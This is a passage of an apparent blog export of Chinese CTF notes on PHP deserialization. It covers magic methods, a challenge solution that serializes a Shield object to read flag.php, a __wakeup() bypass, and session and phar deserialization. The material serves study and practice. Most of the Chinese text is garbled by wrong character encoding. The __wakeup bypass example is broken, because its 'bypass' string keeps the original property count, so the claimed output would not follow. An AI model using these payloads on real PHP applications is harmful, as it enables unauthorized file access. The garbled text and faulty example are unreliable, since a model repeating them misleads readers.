<li><p>åœ¨é™æ€ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸€ä¸ªä¸å¯è®¿é—®æ–¹æ³•æ—¶ï¼Œ<code>__callStatic()</code> ä¼šè¢«<code>è°ƒç”¨</code></p>
</li>
<li><p><code>$name</code>å‚æ•°æ˜¯è¦è°ƒç”¨çš„æ–¹æ³•åç§°ã€‚<code>$arguments</code>å‚æ•°æ˜¯ä¸€ä¸ªæšä¸¾æ•°ç»„ï¼ŒåŒ…å«ç€è¦ä¼ é€’ç»™æ–¹æ³• <code>$name</code> çš„å‚æ•°ã€‚</p>
</li>
</ul>
<p>8ã€<code>__set()</code> <code>__get()</code> <code>__isset()</code> <code>__unset</code></p>
<ul>
<li>åœ¨ç»™ä¸å¯è®¿é—®å±æ€§èµ‹å€¼æ—¶ï¼Œ<code>__set()</code> ä¼šè¢«è°ƒç”¨ã€‚</li>
<li>è¯»å–ä¸å¯è®¿é—®å±æ€§çš„å€¼æ—¶ï¼Œ<code>__get()</code> ä¼šè¢«è°ƒç”¨ã€‚</li>
<li>å½“å¯¹ä¸å¯è®¿é—®å±æ€§è°ƒç”¨ <code>isset()</code> æˆ– <code>empty()</code> æ—¶ï¼Œ<code>__isset()</code> ä¼šè¢«è°ƒç”¨ã€‚</li>
<li>å½“å¯¹ä¸å¯è®¿é—®å±æ€§è°ƒç”¨ <code>unset()</code> æ—¶ï¼Œ<code>__unset()</code> ä¼šè¢«è°ƒç”¨ã€‚</li>
<li>å‚æ•° <code>$name</code> æ˜¯æŒ‡è¦æ“ä½œçš„å˜é‡åç§°ã€‚<code>__set()</code> æ–¹æ³•çš„ <code>$value</code> å‚æ•°æŒ‡å®šäº† <code>$name</code>å˜é‡çš„å€¼ã€‚</li>
<li>å±æ€§é‡è½½åªèƒ½åœ¨å¯¹è±¡ä¸­è¿›è¡Œã€‚åœ¨é™æ€æ–¹æ³•ä¸­ï¼Œè¿™äº›é­”æœ¯æ–¹æ³•å°†ä¸ä¼šè¢«è°ƒç”¨ã€‚æ‰€ä»¥è¿™äº›æ–¹æ³•éƒ½ä¸èƒ½è¢«å£°æ˜ä¸º <code>static</code>ã€‚ä» PHP 5.3.0 èµ·, å°†è¿™äº›é­”æœ¯æ–¹æ³•å®šä¹‰ä¸º <em>static</em> ä¼šäº§ç”Ÿä¸€ä¸ª<strong>è­¦å‘Š</strong>ã€‚</li>
</ul>
<p>9ã€<code>__set_state()</code></p>
<ul>
<li><p>è‡ª PHP 5.1.0 èµ·å½“è°ƒç”¨ <code>var_export()</code>å¯¼å‡ºç±»æ—¶ï¼Œæ­¤<strong>é™æ€</strong>æ–¹æ³•ä¼šè¢«è°ƒç”¨ã€‚</p>
</li>
<li><p>æœ¬æ–¹æ³•çš„å”¯ä¸€å‚æ•°æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œå…¶ä¸­åŒ…å«æŒ‰ <em>array(â€˜propertyâ€™ =&gt; value, â€¦)</em> æ ¼å¼æ’åˆ—çš„ç±»å±æ€§ã€‚</p>
</li>
<li><p>ç¤ºä¾‹</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class A&#123;</span><br><span class="line">    public $var1;</span><br><span class="line">    public $var2;</span><br><span class="line">    public static function __set_state($an_array)&#123; &#x2F;&#x2F; As of PHP 5.1.0</span><br><span class="line">        $obj &#x3D; new A;</span><br><span class="line">        $obj-&gt;var1 &#x3D; $an_array[&#39;var1&#39;];</span><br><span class="line">        $obj-&gt;var2 &#x3D; $an_array[&#39;var2&#39;];</span><br><span class="line">        return $obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a &#x3D; new A;</span><br><span class="line">$a-&gt;var1 &#x3D; 5;</span><br><span class="line">$a-&gt;var2 &#x3D; &#39;foo&#39;;</span><br><span class="line"></span><br><span class="line">eval(&#39;$b &#x3D; &#39; . var_export($a, true) . &#39;;&#39;); </span><br><span class="line">&#x2F;&#x2F; $b &#x3D; A::__set_state(array(</span><br><span class="line">&#x2F;&#x2F;    &#39;var1&#39; &#x3D;&gt; 5,</span><br><span class="line">&#x2F;&#x2F;    &#39;var2&#39; &#x3D;&gt; &#39;foo&#39;,</span><br><span class="line">&#x2F;&#x2F; ));</span><br><span class="line">var_dump($b);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;ä»¥ä¸Šæ ·ä¾‹ä¼šè¾“å‡ºï¼š</span><br><span class="line">object(A)#2 (2) &#123;</span><br><span class="line">  [&quot;var1&quot;]&#x3D;&gt;</span><br><span class="line">  int(5)</span><br><span class="line">  [&quot;var2&quot;]&#x3D;&gt;</span><br><span class="line">  string(3) &quot;foo&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>10ã€<code>__clone()</code></p>
</li>
<li><p>å½“å¯¹è±¡è¢«å¤åˆ¶åï¼ŒPHP 5 ä¼šå¯¹å¯¹è±¡çš„æ‰€æœ‰å±æ€§æ‰§è¡Œä¸€ä¸ªæµ…å¤åˆ¶ï¼ˆshallow copyï¼‰ã€‚æ‰€æœ‰çš„å¼•ç”¨å±æ€§ ä»ç„¶ä¼šæ˜¯ä¸€ä¸ªæŒ‡å‘åŸæ¥çš„å˜é‡çš„å¼•ç”¨ã€‚</p>
</li>
<li><p>å½“å¤åˆ¶å®Œæˆæ—¶ï¼Œå¦‚æœå®šä¹‰äº† <code>__clone()</code> æ–¹æ³•ï¼Œåˆ™æ–°åˆ›å»ºçš„å¯¹è±¡ï¼ˆå¤åˆ¶ç”Ÿæˆçš„å¯¹è±¡ï¼‰ä¸­çš„<code>__clone()</code>æ–¹æ³•ä¼šè¢«è°ƒç”¨ï¼Œå¯ç”¨äºä¿®æ”¹å±æ€§çš„å€¼ï¼ˆå¦‚æœæœ‰å¿…è¦çš„è¯ï¼‰</p>
</li>
<li><p>ç¤ºä¾‹</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class SubObject&#123;</span><br><span class="line">    static $instances &#x3D; 0;</span><br><span class="line">    public $instance;</span><br><span class="line"></span><br><span class="line">    public function __construct() &#123;</span><br><span class="line">        $this-&gt;instance &#x3D; ++self::$instances;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __clone() &#123;</span><br><span class="line">        $this-&gt;instance &#x3D; ++self::$instances;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class MyCloneable&#123;</span><br><span class="line">    public $object1;</span><br><span class="line">    public $object2;</span><br><span class="line"></span><br><span class="line">    function __clone()&#123;      </span><br><span class="line">        &#x2F;&#x2F; å¼ºåˆ¶å¤åˆ¶ä¸€ä»½this-&gt;objectï¼Œ å¦åˆ™ä»ç„¶æŒ‡å‘åŒä¸€ä¸ªå¯¹è±¡</span><br><span class="line">        $this-&gt;object1 &#x3D; clone $this-&gt;object1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$obj &#x3D; new MyCloneable();</span><br><span class="line"></span><br><span class="line">$obj-&gt;object1 &#x3D; new SubObject();</span><br><span class="line">$obj-&gt;object2 &#x3D; new SubObject();</span><br><span class="line"></span><br><span class="line">$obj2 &#x3D; clone $obj;</span><br><span class="line"></span><br><span class="line">print(&quot;Original Object:\n&quot;);</span><br><span class="line">print_r($obj);</span><br><span class="line"></span><br><span class="line">print(&quot;Cloned Object:\n&quot;);</span><br><span class="line">print_r($obj2);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;ä»¥ä¸Šæ ·ä¾‹ä¼šè¾“å‡º</span><br><span class="line">Original Object:</span><br><span class="line">MyCloneable Object</span><br><span class="line">(</span><br><span class="line">    [object1] &#x3D;&gt; SubObject Object</span><br><span class="line">        (</span><br><span class="line">            [instance] &#x3D;&gt; 1</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    [object2] &#x3D;&gt; SubObject Object</span><br><span class="line">        (</span><br><span class="line">            [instance] &#x3D;&gt; 2</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">)</span><br><span class="line">Cloned Object:</span><br><span class="line">MyCloneable Object</span><br><span class="line">(</span><br><span class="line">    [object1] &#x3D;&gt; SubObject Object</span><br><span class="line">        (</span><br><span class="line">            [instance] &#x3D;&gt; 3</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    [object2] &#x3D;&gt; SubObject Object</span><br><span class="line">        (</span><br><span class="line">            [instance] &#x3D;&gt; 2</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">)</span><br><span class="line">&#x2F;&#x2F;åŸå§‹ç±»ç»è¿‡å…‹éš†å</span><br><span class="line">&#x2F;&#x2F;object1å¯¹è±¡instanceå±æ€§çš„å€¼è‡ªå¢äº†1æ¬¡,è§¦å‘äº†__clone()æ–¹æ³•,è¾¾åˆ°äº†ä¿®æ”¹å±æ€§å€¼çš„ç›®çš„</span><br><span class="line">&#x2F;&#x2F;object2å¯¹è±¡instanceå±æ€§çš„å€¼åªæ˜¯ç®€å•å¤åˆ¶.ä»ç„¶æŒ‡å‘åŸæ¥å¯¹è±¡</span><br></pre></td></tr></table></figure>
<h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2></li>
<li><p>æ„é€ å‡½æ•° <code>__construct</code> å¯¹è±¡è¢«åˆ›å»ºçš„æ—¶å€™è°ƒç”¨</p>
</li>
<li><p>ææ„å‡½æ•° <code>__destruct</code> å¯¹è±¡è¢«é”€æ¯çš„æ—¶å€™è°ƒç”¨</p>
</li>
<li><p>æ–¹æ³•é‡è½½ <code>__call</code> åœ¨å¯¹è±¡ä¸­è°ƒç”¨ä¸€ä¸ªä¸å¯è®¿é—®æ–¹æ³•æ—¶è°ƒç”¨</p>
</li>
<li><p>æ–¹æ³•é‡è½½ <code>__callStatic</code> åœ¨é™æ€ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸€ä¸ªä¸å¯è®¿é—®æ–¹æ³•æ—¶è°ƒç”¨</p>
</li>
<li><p>åœ¨ç»™ä¸å¯è®¿é—®å±æ€§èµ‹å€¼æ—¶ï¼Œ<code>__set()</code> ä¼šè¢«è°ƒç”¨ã€‚</p>
</li>
<li><p>è¯»å–ä¸å¯è®¿é—®å±æ€§çš„å€¼æ—¶ï¼Œ<code>__get()</code> ä¼šè¢«è°ƒç”¨ã€‚</p>
</li>
<li><p>å½“å¯¹ä¸å¯è®¿é—®å±æ€§è°ƒç”¨ <code>isset()</code> æˆ– <code>empty()</code> æ—¶ï¼Œ<code>__isset()</code> ä¼šè¢«è°ƒç”¨</p>
</li>
<li><p>å½“å¯¹ä¸å¯è®¿é—®å±æ€§è°ƒç”¨ <code>unset()</code> æ—¶ï¼Œ<code>__unset()</code> ä¼šè¢«è°ƒç”¨</p>
</li>
<li><p><code>__sleep()</code> åœ¨<code>serialize()</code> å‡½æ•°æ‰§è¡Œä¹‹å‰è°ƒç”¨</p>
</li>
<li><p><code>__wakeup()</code> åœ¨<code>unserialize()</code> å‡½æ•°æ‰§è¡Œä¹‹å‰è°ƒç”¨</p>
</li>
<li><p><code>__toString</code> åœ¨ä¸€ä¸ªç±»è¢«å½“æˆå­—ç¬¦ä¸²æ—¶è¢«è°ƒç”¨ï¼ˆä¸ä»…ä»…æ˜¯echoçš„æ—¶å€™,æ¯”å¦‚file_exists()åˆ¤æ–­ä¹Ÿä¼šè§¦å‘</p>
</li>
</ul>
<h2 id="ä¾‹é¢˜"><a href="#ä¾‹é¢˜" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h2><h3 id="æºç "><a href="#æºç " class="headerlink" title="æºç "></a>æºç </h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;index.php</span><br><span class="line">&lt;?php </span><br><span class="line">    require_once(&#39;shield.php&#39;);</span><br><span class="line">    $x &#x3D; new Shield();</span><br><span class="line">    isset($_GET[&#39;class&#39;]) &amp;&amp; $g &#x3D; $_GET[&#39;class&#39;];</span><br><span class="line">    if (!empty($g)) &#123;</span><br><span class="line">        $x &#x3D; unserialize($g);</span><br><span class="line">    &#125;</span><br><span class="line">    echo $x-&gt;readfile();</span><br><span class="line">?&gt;</span><br><span class="line">&#x2F;&#x2F;shield.php</span><br><span class="line">&lt;?php</span><br><span class="line">    &#x2F;&#x2F;flag is in flag.php</span><br><span class="line">    class Shield &#123;</span><br><span class="line">        public $file;</span><br><span class="line">        function __construct($filename &#x3D; &#39;&#39;) &#123;</span><br><span class="line">            $this -&gt; file &#x3D; $filename;</span><br><span class="line">        &#125;</span><br><span class="line">        function readfile() &#123;</span><br><span class="line">            if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,&#39;..&#39;)&#x3D;&#x3D;&#x3D;FALSE  </span><br><span class="line">            &amp;&amp; stripos($this-&gt;file,&#39;&#x2F;&#39;)&#x3D;&#x3D;&#x3D;FALSE &amp;&amp; stripos($this-&gt;file,&#39;\\&#39;)&#x3D;&#x3D;FALSE) &#123;</span><br><span class="line">                return @file_get_contents($this-&gt;file);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h3 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>ä¼ å…¥ä¸€ä¸ªå‚æ•°<code>class</code>,classèµ‹å€¼ç»™$g,ç„¶åå¯¹gè¿›è¡Œååºåˆ—åŒ–</p>
<p>åˆ©ç”¨çš„å¯¹è±¡æ˜¯Shield,ä¸¤ä¸ªæ–¹æ³•,<code>__construct</code>åœ¨å¯¹è±¡è¢«åˆ›å»ºæ—¶è°ƒç”¨,è¿™é‡Œå¹¶æ²¡æœ‰åˆ›å»ºå¯¹è±¡,è¿™é‡Œä¸éœ€è¦åˆ›å»ºå¯¹è±¡,æ‰€ä»¥ååºåˆ—åŒ–ä¸ä¼šè§¦å‘è¯¥æ–¹æ³•</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class Shield &#123;</span><br><span class="line">        public $file&#x3D;&quot;flag.php&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$a&#x3D;new Shield();</span><br><span class="line">echo serialize($a);</span><br><span class="line">&#x2F;&#x2F;å°†è¾“å‡ºå€¼ä¼ è¿‡å»å³å¯è¯»å–flagæ–‡ä»¶å¾—åˆ°flag</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>CTF</category>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>PHPååºåˆ—åŒ–ç»•è¿‡å§¿åŠ¿</title>
    <url>/2020/04/14/CTF/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/</url>
    <content><![CDATA[<h1 id="PHPååºåˆ—åŒ–ç»•è¿‡å§¿åŠ¿"><a href="#PHPååºåˆ—åŒ–ç»•è¿‡å§¿åŠ¿" class="headerlink" title="PHPååºåˆ—åŒ–ç»•è¿‡å§¿åŠ¿"></a>PHPååºåˆ—åŒ–ç»•è¿‡å§¿åŠ¿</h1><h2 id="è®¿é—®æ§åˆ¶"><a href="#è®¿é—®æ§åˆ¶" class="headerlink" title="è®¿é—®æ§åˆ¶"></a>è®¿é—®æ§åˆ¶</h2><a id="more"></a>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class test&#123;</span><br><span class="line">    private $test1&#x3D;&quot;hello&quot;;</span><br><span class="line">    public $test2&#x3D;&quot;hello&quot;;</span><br><span class="line">    protected $test3&#x3D;&quot;hello&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$test &#x3D; new test();</span><br><span class="line">echo serialize($test);  </span><br><span class="line">&#x2F;&#x2F;è¾“å‡ºåˆ°æ§åˆ¶å°æ˜¯è¿™æ ·çš„</span><br><span class="line">O:4:&quot;test&quot;:3:&#123;s:11:&quot; test test1&quot;;s:5:&quot;hello&quot;;s:5:&quot;test2&quot;;s:5:&quot;hello&quot;;s:8:&quot; * test3&quot;;s:5:&quot;hello&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p>ä½†æ˜¯å…¶å®ç»“æœä¸æ˜¯è¿™æ ·çš„</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;s:11:&quot;\00test\00test1&quot;;s:5:&quot;hello&quot;;s:5:&quot;test2&quot;;s:5:&quot;hello&quot;;s:8:&quot;\00*\00test3&quot;;s:5:&quot;hello&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p>ç»“æœæ˜¯è¿™æ ·çš„,åªæ˜¯å› ä¸º\00æ˜¯ç©ºå­—ç¬¦åœ¨æ§åˆ¶å°ä¸æ˜¾ç¤º</p>
<p>ä»”ç»†è§‚å¯Ÿ,s:åé¢çš„æ•°å­—,åå±æ€§åæ˜¯ä¸åŒ¹é…çš„,è¯´æ˜æœ‰äº›å­—ç¬¦æ²¡æœ‰æ˜¾ç¤º,å°±æ˜¯ç©ºå­—ç¬¦</p>
<p>å¦‚æœåœ¨urlä¼ å‚ä¸­å°±éœ€è¦å°†<code>\00</code>ç¼–ç ç§°<code>%00</code>è¿›è¡Œä¼ å‚</p>
<p>æ¯”å¦‚ä¸Šè¿°ä¼ å‚å°±éœ€è¦</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?a&#x3D;&#123;s:11:&quot;%00test%00test1&quot;;s:5:&quot;hello&quot;;s:5:&quot;test2&quot;;s:5:&quot;hello&quot;;s:8:&quot;%00*%00test3&quot;;s:5:&quot;hello&quot;;&#125;</span><br></pre></td></tr></table></figure>
<h2 id="wakeup"><a href="#wakeup" class="headerlink" title="__wakeup()"></a>__wakeup()</h2><p><strong>åºåˆ—åŒ–å­—ç¬¦ä¸²ä¸­è¡¨ç¤ºå¯¹è±¡å±æ€§ä¸ªæ•°çš„å€¼å¤§äºçœŸå®çš„å±æ€§ä¸ªæ•°æ—¶ä¼šè·³è¿‡__wakeupçš„æ‰§è¡Œ,å¹¶ä¸”ä¸ä¼šæŠ¥é”™,å¯ä»¥è¢«æ­£å¸¸ååºåˆ—åŒ–</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class test &#123;</span><br><span class="line">	public $a&#x3D;&quot;flag&#123;test&#125;&quot;;</span><br><span class="line">	function __wakeup () &#123;</span><br><span class="line">		&#x2F;&#x2F; TODO: Implement __wakeup() method.</span><br><span class="line">		$this-&gt;a&#x3D;&quot;no&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">	function __destruct () &#123;</span><br><span class="line">		&#x2F;&#x2F; TODO: Implement __destruct() method.</span><br><span class="line">		echo $this-&gt;a;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a&#x3D;&quot;O:4:\&quot;test\&quot;:1:&#123;s:1:\&quot;a\&quot;;s:10:\&quot;flag&#123;test&#125;\&quot;;&#125;&quot;;</span><br><span class="line">$b &#x3D; unserialize($a);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;è¾“å‡º</span><br><span class="line">no</span><br></pre></td></tr></table></figure>
<p>å½“æˆ‘ä»¬æ­£å¸¸ä¼ å…¥ä¸€ä¸ªåºåˆ—åŒ–å­—ç¬¦ä¸²æ—¶,ä¼šè§¦å‘<code>__wakeup()</code>,åªèƒ½è¾“å‡ºno</p>
<p>ä½†æ˜¯å½“ä¼ å…¥çš„å±æ€§å€¼å¤§äºçœŸå®çš„å±æ€§å€¼æ—¶,å°±ä¼šæ­£å¸¸è¾“å‡ºflag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$a&#x3D;&quot;O:4:\&quot;test\&quot;:1:&#123;s:1:\&quot;a\&quot;;s:10:\&quot;flag&#123;test&#125;\&quot;;&#125;&quot;;</span><br><span class="line">$b &#x3D; unserialize($a);</span><br><span class="line">&#x2F;&#x2F;è¾“å‡º</span><br><span class="line">flag&#123;test&#125;</span><br></pre></td></tr></table></figure>
<p><strong>æ³¨æ„ï¼š</strong>è¯¥æ¼æ´åœ¨PHP7.3.0æ˜¯ä¸èƒ½å¤ç°æˆåŠŸçš„</p>
<p>PHP7.3.0ç‰ˆæœ¬ä¸­å¹¶æ²¡æœ‰å‡ºç°ç±»ä¼¼PHP5.6çš„è°ƒç”¨è¿‡ç¨‹ï¼Œåªæ˜¯åšäº†ç®€å•çš„æ ‡è®°ï¼Œæ•´ä¸ªé­”æ³•å‡½æ•°çš„è°ƒç”¨è¿‡ç¨‹çš„æ—¶æœºç§»è‡³é‡Šæ”¾æ•°æ®å¤„ã€‚è¿™æ ·å°±é¿å…äº†è¿™ä¸ªç»•è¿‡çš„é—®é¢˜</p>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://paper.seebug.org/866/#321-unserialize">PHP å†…æ ¸å±‚è§£æååºåˆ—åŒ–æ¼æ´â€”ç»•è¿‡__wakeup()</a></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>PHPå¸¸è§ååºåˆ—åŒ–æ¼æ´</title>
    <url>/2020/04/14/CTF/PHP%E5%B8%B8%E8%A7%81%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id="PHPå¸¸è§ååºåˆ—åŒ–æ¼æ´"><a href="#PHPå¸¸è§ååºåˆ—åŒ–æ¼æ´" class="headerlink" title="PHPå¸¸è§ååºåˆ—åŒ–æ¼æ´"></a>PHPå¸¸è§ååºåˆ—åŒ–æ¼æ´</h1><h2 id="Sessionååºåˆ—åŒ–æ¼æ´"><a href="#Sessionååºåˆ—åŒ–æ¼æ´" class="headerlink" title="Sessionååºåˆ—åŒ–æ¼æ´"></a>Sessionååºåˆ—åŒ–æ¼æ´</h2><h3 id="Sessionåºåˆ—åŒ–æœºåˆ¶"><a href="#Sessionåºåˆ—åŒ–æœºåˆ¶" class="headerlink" title="Sessionåºåˆ—åŒ–æœºåˆ¶"></a>Sessionåºåˆ—åŒ–æœºåˆ¶</h3><p>Sessionæ˜¯ä»¥åºåˆ—åŒ–å­—ç¬¦ä¸²çš„å½¢å¼å­˜å‚¨åœ¨æ–‡ä»¶ä¸­çš„,è¯»å–Sessionæ˜¯ä¸€ä¸ªååºåˆ—åŒ–çš„è¿‡ç¨‹,é‚£ä¹ˆå°±æœ‰å¯èƒ½å‡ºç°ååºåˆ—åŒ–æ¼æ´</p>
<p>å½“session_start()è¢«è°ƒç”¨æˆ–è€…php.iniä¸­session.auto_startä¸º1æ—¶ï¼ŒPHPå†…éƒ¨è°ƒç”¨ä¼šè¯ç®¡ç†å™¨ï¼Œè®¿é—®ç”¨æˆ·sessionè¢«åºåˆ—åŒ–ä»¥åï¼Œå­˜å‚¨åˆ°æŒ‡å®šç›®å½•ï¼ˆé»˜è®¤ä¸º/tmpï¼‰</p>
<a id="more"></a>

<p>PHPå¤„ç†å™¨çš„ä¸‰ç§åºåˆ—åŒ–æ–¹å¼ï¼š</p>
<table>
<thead>
<tr>
<th align="left">å¤„ç†å™¨</th>
<th align="left">å­˜å‚¨æ–¹å¼</th>
</tr>
</thead>
<tbody><tr>
<td align="left">php_binary</td>
<td align="left">é”®åçš„é•¿åº¦å¯¹åº”çš„ASCIIå­—ç¬¦ï¼‹é”®åï¼‹ç»è¿‡serialize() å‡½æ•°ååºåˆ—å¤„ç†çš„å€¼</td>
</tr>
<tr>
<td align="left">php</td>
<td align="left">é”®åï¼‹ç«–çº¿ï¼‹ç»è¿‡serialize()å‡½æ•°ååºåˆ—å¤„ç†çš„å€¼</td>
</tr>
<tr>
<td align="left">php_serialize</td>
<td align="left">serialize()å‡½æ•°ååºåˆ—å¤„ç†æ•°ç»„æ–¹å¼</td>
</tr>
</tbody></table>
<p>php.iniä¸­å«æœ‰å‡ ä¸ªä¸sessionå­˜å‚¨é…ç½®ç›¸å…³çš„é…ç½®é¡¹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">session.save_path&#x3D;&quot;&quot;   --è®¾ç½®sessionçš„å­˜å‚¨è·¯å¾„,é»˜è®¤åœ¨&#x2F;tmp</span><br><span class="line">session.auto_start   --æŒ‡å®šä¼šè¯æ¨¡å—æ˜¯å¦åœ¨è¯·æ±‚å¼€å§‹æ—¶å¯åŠ¨ä¸€ä¸ªä¼šè¯,é»˜è®¤ä¸º0ä¸å¯åŠ¨</span><br><span class="line">session.serialize_handler   --å®šä¹‰ç”¨æ¥åºåˆ—åŒ–&#x2F;ååºåˆ—åŒ–çš„å¤„ç†å™¨åå­—ã€‚é»˜è®¤ä½¿ç”¨php</span><br></pre></td></tr></table></figure>
<h3 id="ç®€è¦åˆ†æ"><a href="#ç®€è¦åˆ†æ" class="headerlink" title="ç®€è¦åˆ†æ"></a>ç®€è¦åˆ†æ</h3><p>å½“ç”±äºå¤„ç†sessionçš„å¤„ç†å™¨ä¸åŒæ—¶å°±å¯ä»¥è§¦å‘ååºåˆ—åŒ–æ¼æ´</p>
<p>å¤„ç†å™¨æ˜¯phpæ—¶,æ˜¯ä»¥|åä¸ºååºåˆ—åŒ–å†…å®¹çš„,è€Œç”¨php_serializeå­˜å‚¨çš„sessionå¦‚æœæ²¡æœ‰è¿‡æ»¤<code>|</code>å­—ç¬¦å°±ä¼šå¯¼è‡´phpå¤„ç†å™¨å°†åé¢çš„å†…å®¹ååºåˆ—åŒ–,è¾¾åˆ°ååºåˆ—åŒ–æˆå¯¹è±¡çš„ç›®çš„</p>
<h2 id="pharä¼ªåè®®è§¦å‘ååºåˆ—åŒ–"><a href="#pharä¼ªåè®®è§¦å‘ååºåˆ—åŒ–" class="headerlink" title="pharä¼ªåè®®è§¦å‘ååºåˆ—åŒ–"></a>pharä¼ªåè®®è§¦å‘ååºåˆ—åŒ–</h2><h3 id="phar-åè®®"><a href="#phar-åè®®" class="headerlink" title="phar://åè®®"></a>phar://åè®®</h3><p>å¯ä»¥å°†å¤šä¸ªæ–‡ä»¶å½’å…¥ä¸€ä¸ªæœ¬åœ°æ–‡ä»¶å¤¹ï¼Œä¹Ÿå¯ä»¥åŒ…å«ä¸€ä¸ªæ–‡ä»¶</p>
<h3 id="pharæ–‡ä»¶"><a href="#pharæ–‡ä»¶" class="headerlink" title="pharæ–‡ä»¶"></a>pharæ–‡ä»¶</h3><p>PHARï¼ˆPHPå½’æ¡£ï¼‰æ–‡ä»¶æ˜¯ä¸€ç§æ‰“åŒ…æ ¼å¼ï¼Œé€šè¿‡å°†è®¸å¤šPHPä»£ç æ–‡ä»¶å’Œå…¶ä»–èµ„æºï¼ˆä¾‹å¦‚å›¾åƒï¼Œæ ·å¼è¡¨ç­‰ï¼‰æ†ç»‘åˆ°ä¸€ä¸ªå½’æ¡£æ–‡ä»¶ä¸­æ¥å®ç°åº”ç”¨ç¨‹åºå’Œåº“çš„åˆ†å‘ã€‚æ‰€æœ‰PHARæ–‡ä»¶éƒ½ä½¿ç”¨<code>.phar</code>ä½œä¸ºæ–‡ä»¶æ‰©å±•åï¼ŒPHARæ ¼å¼çš„å½’æ¡£éœ€è¦ä½¿ç”¨è‡ªå·±å†™çš„PHPä»£ç ã€‚</p>
<p>å®‰è£…pharæ‰©å±•ç„¶ååœ¨php.iniä¸­è®¾ç½®phar.readonly=offæˆ–0æ‰å¯ä»¥ä½¿ç”¨pharå¯¹è±¡åˆ›å»ºpharæ–‡ä»¶</p>
<h3 id="pharæ–‡ä»¶ç»“æ„"><a href="#pharæ–‡ä»¶ç»“æ„" class="headerlink" title="pharæ–‡ä»¶ç»“æ„"></a>pharæ–‡ä»¶ç»“æ„</h3><p><a href="https://www.php.net/phar">Pharå®˜æ–¹æ–‡æ¡£</a></p>
<p>1ã€a stub<br>è¯†åˆ«pharæ‹“å±•çš„æ ‡è¯†ï¼Œæ ¼å¼:xxxã€‚å¯¹åº”çš„å‡½æ•°Phar::setStub</p>
<p>2ã€a manifest describing the contents<br>è¢«å‹ç¼©æ–‡ä»¶çš„æƒé™ã€å±æ€§ç­‰ä¿¡æ¯éƒ½æ”¾åœ¨è¿™éƒ¨åˆ†ã€‚è¿™éƒ¨åˆ†è¿˜ä¼šä»¥åºåˆ—åŒ–çš„å½¢å¼å­˜å‚¨ç”¨æˆ·è‡ªå®šä¹‰çš„meta-dataï¼Œè¿™æ˜¯æ¼æ´åˆ©ç”¨çš„æ ¸å¿ƒéƒ¨åˆ†ã€‚å¯¹åº”å‡½æ•°Phar::setMetadataâ€”è®¾ç½®pharå½’æ¡£å…ƒæ•°æ®</p>
<p>3ã€ the file contents<br>è¢«å‹ç¼©æ–‡ä»¶çš„å†…å®¹ã€‚</p>
<p>4ã€[optional] a signature for verifying Phar integrity (phar file format only)<br>ç­¾åï¼Œæ”¾åœ¨æ–‡ä»¶æœ«å°¾ã€‚å¯¹åº”å‡½æ•°Phar :: stopBuffering â€”åœæ­¢ç¼“å†²å¯¹Pharå­˜æ¡£çš„å†™å…¥è¯·æ±‚ï¼Œå¹¶å°†æ›´æ”¹ä¿å­˜åˆ°ç£ç›˜</p>
